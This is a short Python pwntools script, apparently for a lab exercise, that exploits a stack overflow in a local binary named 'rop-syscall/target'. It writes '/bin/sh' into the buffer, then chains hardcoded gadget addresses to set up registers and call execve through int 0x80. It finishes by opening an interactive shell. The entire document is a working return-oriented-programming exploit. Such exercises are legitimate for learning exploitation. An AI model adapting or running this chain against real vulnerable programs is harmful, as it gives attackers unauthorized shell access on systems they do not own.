from pwn import *

TARGET = "/home/lab09/rop-syscall/target"

p = process(TARGET)

pop_eax_garget = 0x080491e9
pop_ebx_garget = 0x08049022
pop_ecx_garget = 0x080491f5
pop_edx_pop_edi_garget = 0x080491eb
int_0x80_garget = 0x080491de

# mov ebx, eax ; ret -> is not in the binary

mov_edi_eax_garget = 0x080491fc
mov_edx_edi_4pop_garget = 0x080491d7
mov_ebx_edx_garget = 0x080491e1

payload = b"/bin/sh\x00"
payload += b"A" * (28 - len(payload))
payload += p32(mov_edi_eax_garget)
payload += p32(mov_edx_edi_4pop_garget)
payload += p32(0xdeadbeef) * 4
payload += p32(mov_ebx_edx_garget)
payload += p32(pop_edx_pop_edi_garget)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(pop_eax_garget)
payload += p32(11)
payload += p32(pop_ecx_garget)
payload += p32(0x0)
payload += p32(int_0x80_garget)

p.sendline(payload)
p.interactive()